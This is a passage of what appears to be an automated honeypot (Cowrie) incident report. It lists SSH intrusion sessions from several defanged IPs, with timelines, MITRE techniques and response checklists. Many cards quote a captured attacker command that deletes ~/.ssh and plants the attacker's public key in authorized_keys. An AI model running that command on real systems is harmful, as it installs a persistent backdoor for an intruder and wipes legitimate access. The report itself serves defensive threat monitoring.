| `2026-04-23 21:23:59` | `cowrie.command.failed` |
| `2026-04-23 21:23:59` | `cowrie.log.closed` |
| `2026-04-23 21:23:59` | `cowrie.session.params` |
| `2026-04-23 21:23:59` | `cowrie.command.input` |
| `2026-04-23 21:23:59` | `cowrie.session.file_download` |
| `2026-04-23 21:23:59` | `cowrie.log.closed` |
| `2026-04-23 21:24:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.103.202[.]193` to AbuseIPDB if not already reported
- [ ] Block `185.103.202[.]193` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3df8f95e48eb

| Field | Detail |
|---|---|
| **Source IP** | `185.103.202[.]193` |
| **First Seen** | 2026-04-23 21:24 |
| **Last Seen** | 2026-04-23 21:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:24:02` | `cowrie.session.connect` |
| `2026-04-23 21:24:02` | `cowrie.client.version` |
| `2026-04-23 21:24:02` | `cowrie.client.kex` |
| `2026-04-23 21:24:02` | `cowrie.login.success` |
| `2026-04-23 21:24:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.103.202[.]193` to AbuseIPDB if not already reported
- [ ] Block `185.103.202[.]193` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f066aaffa59

| Field | Detail |
|---|---|
| **Source IP** | `103.31.38[.]83` |
| **First Seen** | 2026-04-23 21:34 |
| **Last Seen** | 2026-04-23 21:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:34:32` | `cowrie.session.connect` |
| `2026-04-23 21:34:32` | `cowrie.client.version` |
| `2026-04-23 21:34:33` | `cowrie.client.kex` |
| `2026-04-23 21:34:33` | `cowrie.login.success` |
| `2026-04-23 21:34:34` | `cowrie.session.params` |
| `2026-04-23 21:34:34` | `cowrie.command.input` |
| `2026-04-23 21:34:34` | `cowrie.command.failed` |
| `2026-04-23 21:34:34` | `cowrie.log.closed` |
| `2026-04-23 21:34:35` | `cowrie.session.params` |
| `2026-04-23 21:34:35` | `cowrie.command.input` |
| `2026-04-23 21:34:35` | `cowrie.session.file_download` |
| `2026-04-23 21:34:35` | `cowrie.log.closed` |
| `2026-04-23 21:34:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.38[.]83` to AbuseIPDB if not already reported
- [ ] Block `103.31.38[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03d3fb719cff

| Field | Detail |
|---|---|
| **Source IP** | `103.31.38[.]83` |
| **First Seen** | 2026-04-23 21:34 |
| **Last Seen** | 2026-04-23 21:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:34:38` | `cowrie.session.connect` |
| `2026-04-23 21:34:38` | `cowrie.client.version` |
| `2026-04-23 21:34:38` | `cowrie.client.kex` |
| `2026-04-23 21:34:39` | `cowrie.login.success` |
| `2026-04-23 21:34:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.38[.]83` to AbuseIPDB if not already reported
- [ ] Block `103.31.38[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cef24f1c675

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 21:34 |
| **Last Seen** | 2026-04-23 21:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:34:56` | `cowrie.session.connect` |
| `2026-04-23 21:34:56` | `cowrie.client.version` |
| `2026-04-23 21:34:56` | `cowrie.client.kex` |
| `2026-04-23 21:34:57` | `cowrie.login.success` |
| `2026-04-23 21:34:57` | `cowrie.session.params` |
| `2026-04-23 21:34:57` | `cowrie.command.input` |
| `2026-04-23 21:34:57` | `cowrie.command.failed` |
| `2026-04-23 21:34:58` | `cowrie.log.closed` |
| `2026-04-23 21:34:58` | `cowrie.session.params` |
| `2026-04-23 21:34:58` | `cowrie.command.input` |
| `2026-04-23 21:34:58` | `cowrie.session.file_download` |
| `2026-04-23 21:34:58` | `cowrie.log.closed` |
| `2026-04-23 21:35:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-100ad2d57a63

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 21:35 |
| **Last Seen** | 2026-04-23 21:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:35:01` | `cowrie.session.connect` |
| `2026-04-23 21:35:01` | `cowrie.client.version` |
| `2026-04-23 21:35:01` | `cowrie.client.kex` |
| `2026-04-23 21:35:02` | `cowrie.login.success` |
| `2026-04-23 21:35:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51c029aa8f13

| Field | Detail |
|---|---|
| **Source IP** | `72.56.108[.]236` |
| **First Seen** | 2026-04-23 21:37 |
| **Last Seen** | 2026-04-23 21:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo 'dGVzdA==' | base64 -d 2>/dev/null` |
| **TTPs (MITRE)** | T1027 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:37:06` | `cowrie.session.connect` |
| `2026-04-23 21:37:07` | `cowrie.client.version` |
| `2026-04-23 21:37:07` | `cowrie.client.kex` |
| `2026-04-23 21:37:09` | `cowrie.login.success` |
| `2026-04-23 21:37:10` | `cowrie.session.params` |
| `2026-04-23 21:37:10` | `cowrie.command.input` |
| `2026-04-23 21:37:10` | `cowrie.log.closed` |
| `2026-04-23 21:37:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.56.108[.]236` to AbuseIPDB if not already reported
- [ ] Block `72.56.108[.]236` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d8ffe6b0f08

| Field | Detail |
|---|---|
| **Source IP** | `103.31.38[.]83` |
| **First Seen** | 2026-04-23 21:37 |
| **Last Seen** | 2026-04-23 21:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:37:31` | `cowrie.session.connect` |
| `2026-04-23 21:37:31` | `cowrie.client.version` |
| `2026-04-23 21:37:31` | `cowrie.client.kex` |
| `2026-04-23 21:37:32` | `cowrie.login.success` |
| `2026-04-23 21:37:32` | `cowrie.session.params` |
| `2026-04-23 21:37:32` | `cowrie.command.input` |
| `2026-04-23 21:37:32` | `cowrie.command.failed` |
| `2026-04-23 21:37:32` | `cowrie.log.closed` |
| `2026-04-23 21:37:33` | `cowrie.session.params` |
| `2026-04-23 21:37:33` | `cowrie.command.input` |
| `2026-04-23 21:37:33` | `cowrie.session.file_download` |
| `2026-04-23 21:37:33` | `cowrie.log.closed` |
| `2026-04-23 21:37:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.38[.]83` to AbuseIPDB if not already reported
- [ ] Block `103.31.38[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-273517c15fd2

| Field | Detail |
|---|---|
| **Source IP** | `103.31.38[.]83` |
| **First Seen** | 2026-04-23 21:37 |
| **Last Seen** | 2026-04-23 21:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:37:36` | `cowrie.session.connect` |
| `2026-04-23 21:37:36` | `cowrie.client.version` |
| `2026-04-23 21:37:36` | `cowrie.client.kex` |
| `2026-04-23 21:37:37` | `cowrie.login.success` |
| `2026-04-23 21:37:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.38[.]83` to AbuseIPDB if not already reported
- [ ] Block `103.31.38[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5a68b2dc141

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 21:37 |
| **Last Seen** | 2026-04-23 21:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:37:48` | `cowrie.session.connect` |
| `2026-04-23 21:37:48` | `cowrie.client.version` |
| `2026-04-23 21:37:48` | `cowrie.client.kex` |
| `2026-04-23 21:37:49` | `cowrie.login.success` |
| `2026-04-23 21:37:49` | `cowrie.session.params` |
| `2026-04-23 21:37:49` | `cowrie.command.input` |
| `2026-04-23 21:37:49` | `cowrie.command.failed` |
| `2026-04-23 21:37:50` | `cowrie.log.closed` |
| `2026-04-23 21:37:50` | `cowrie.session.params` |
| `2026-04-23 21:37:50` | `cowrie.command.input` |
| `2026-04-23 21:37:50` | `cowrie.session.file_download` |
| `2026-04-23 21:37:50` | `cowrie.log.closed` |
| `2026-04-23 21:37:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-257721af0e61

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 21:37 |
| **Last Seen** | 2026-04-23 21:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:37:53` | `cowrie.session.connect` |
| `2026-04-23 21:37:53` | `cowrie.client.version` |
| `2026-04-23 21:37:53` | `cowrie.client.kex` |
| `2026-04-23 21:37:54` | `cowrie.login.success` |
| `2026-04-23 21:37:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1573082462c0

| Field | Detail |
|---|---|
| **Source IP** | `103.31.38[.]83` |
| **First Seen** | 2026-04-23 21:40 |
| **Last Seen** | 2026-04-23 21:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:40:28` | `cowrie.session.connect` |
| `2026-04-23 21:40:28` | `cowrie.client.version` |
| `2026-04-23 21:40:28` | `cowrie.client.kex` |
| `2026-04-23 21:40:29` | `cowrie.login.success` |
| `2026-04-23 21:40:30` | `cowrie.session.params` |
| `2026-04-23 21:40:30` | `cowrie.command.input` |
| `2026-04-23 21:40:30` | `cowrie.command.failed` |
| `2026-04-23 21:40:30` | `cowrie.log.closed` |
| `2026-04-23 21:40:30` | `cowrie.session.params` |
| `2026-04-23 21:40:30` | `cowrie.command.input` |
| `2026-04-23 21:40:30` | `cowrie.session.file_download` |
| `2026-04-23 21:40:30` | `cowrie.log.closed` |
| `2026-04-23 21:40:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.38[.]83` to AbuseIPDB if not already reported
- [ ] Block `103.31.38[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-119a55898da4

| Field | Detail |
|---|---|
| **Source IP** | `103.31.38[.]83` |
| **First Seen** | 2026-04-23 21:40 |
| **Last Seen** | 2026-04-23 21:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:40:33` | `cowrie.session.connect` |
| `2026-04-23 21:40:33` | `cowrie.client.version` |
| `2026-04-23 21:40:34` | `cowrie.client.kex` |
| `2026-04-23 21:40:34` | `cowrie.login.success` |
| `2026-04-23 21:40:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.38[.]83` to AbuseIPDB if not already reported
- [ ] Block `103.31.38[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4314a857d7db

| Field | Detail |
|---|---|
| **Source IP** | `103.31.38[.]83` |
| **First Seen** | 2026-04-23 21:43 |
| **Last Seen** | 2026-04-23 21:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:43:21` | `cowrie.session.connect` |
| `2026-04-23 21:43:21` | `cowrie.client.version` |
| `2026-04-23 21:43:22` | `cowrie.client.kex` |
| `2026-04-23 21:43:23` | `cowrie.login.success` |
| `2026-04-23 21:43:23` | `cowrie.session.params` |
| `2026-04-23 21:43:23` | `cowrie.command.input` |
| `2026-04-23 21:43:23` | `cowrie.command.failed` |
| `2026-04-23 21:43:23` | `cowrie.log.closed` |
| `2026-04-23 21:43:24` | `cowrie.session.params` |
| `2026-04-23 21:43:24` | `cowrie.command.input` |
| `2026-04-23 21:43:24` | `cowrie.session.file_download` |
| `2026-04-23 21:43:24` | `cowrie.log.closed` |
| `2026-04-23 21:43:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.38[.]83` to AbuseIPDB if not already reported
- [ ] Block `103.31.38[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a7f396bc0e8

| Field | Detail |
|---|---|
| **Source IP** | `103.31.38[.]83` |
| **First Seen** | 2026-04-23 21:43 |
| **Last Seen** | 2026-04-23 21:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:43:27` | `cowrie.session.connect` |
| `2026-04-23 21:43:27` | `cowrie.client.version` |
| `2026-04-23 21:43:27` | `cowrie.client.kex` |
| `2026-04-23 21:43:28` | `cowrie.login.success` |
| `2026-04-23 21:43:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.38[.]83` to AbuseIPDB if not already reported
- [ ] Block `103.31.38[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95b94c6832cd

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 21:43 |
| **Last Seen** | 2026-04-23 21:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:43:52` | `cowrie.session.connect` |
| `2026-04-23 21:43:52` | `cowrie.client.version` |
| `2026-04-23 21:43:52` | `cowrie.client.kex` |
| `2026-04-23 21:43:53` | `cowrie.login.success` |
| `2026-04-23 21:43:54` | `cowrie.session.params` |
| `2026-04-23 21:43:54` | `cowrie.command.input` |
| `2026-04-23 21:43:54` | `cowrie.command.failed` |
| `2026-04-23 21:43:54` | `cowrie.log.closed` |
| `2026-04-23 21:43:54` | `cowrie.session.params` |
| `2026-04-23 21:43:54` | `cowrie.command.input` |
| `2026-04-23 21:43:55` | `cowrie.session.file_download` |
| `2026-04-23 21:43:55` | `cowrie.log.closed` |
| `2026-04-23 21:43:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01ef3d516d40

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 21:43 |
| **Last Seen** | 2026-04-23 21:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:43:57` | `cowrie.session.connect` |
| `2026-04-23 21:43:57` | `cowrie.client.version` |
| `2026-04-23 21:43:58` | `cowrie.client.kex` |
| `2026-04-23 21:43:59` | `cowrie.login.success` |
| `2026-04-23 21:43:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-455cf4fe9e2e

| Field | Detail |
|---|---|
| **Source IP** | `103.31.38[.]83` |
| **First Seen** | 2026-04-23 21:44 |
| **Last Seen** | 2026-04-23 21:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:44:49` | `cowrie.session.connect` |
| `2026-04-23 21:44:49` | `cowrie.client.version` |
| `2026-04-23 21:44:49` | `cowrie.client.kex` |
| `2026-04-23 21:44:50` | `cowrie.login.success` |
| `2026-04-23 21:44:51` | `cowrie.session.params` |
| `2026-04-23 21:44:51` | `cowrie.command.input` |
| `2026-04-23 21:44:51` | `cowrie.command.failed` |
| `2026-04-23 21:44:51` | `cowrie.log.closed` |
| `2026-04-23 21:44:52` | `cowrie.session.params` |
| `2026-04-23 21:44:52` | `cowrie.command.input` |
| `2026-04-23 21:44:52` | `cowrie.session.file_download` |
| `2026-04-23 21:44:52` | `cowrie.log.closed` |
| `2026-04-23 21:44:56` | `cowrie.session.closed` |

**Recommended Actions:**
